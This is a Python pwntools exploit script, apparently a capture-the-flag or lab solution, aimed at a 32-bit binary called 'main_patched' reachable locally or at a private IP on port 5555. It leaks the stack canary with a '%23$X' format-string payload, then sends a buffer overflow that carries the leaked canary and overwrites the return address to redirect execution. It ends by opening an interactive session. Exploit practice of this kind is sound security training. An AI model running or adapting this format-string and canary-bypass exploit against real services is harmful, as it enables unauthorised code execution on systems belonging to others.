#!/usr/bin/env python3

from pwn import *

exe = ELF("main_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("192.168.1.49", 5555)

    return r


def main():
    r = conn()

    print(r.recvline())

    payload = "%23$X" 
    r.sendline(payload)

    data = r.recvline()
    print(data)
    canary = data[7:15]
    print(b'Canary: ' + canary) 

    canary = p32(int(canary, 16), endianness = 'little')
                                           # main() address
    payload = b'a'*32 + canary + b'b'*12 + p32(0x08049365)

    print(r.recvline())
    r.sendline(payload)
    print(r.recvline())

    r.interactive()


if __name__ == "__main__":
    main()
    

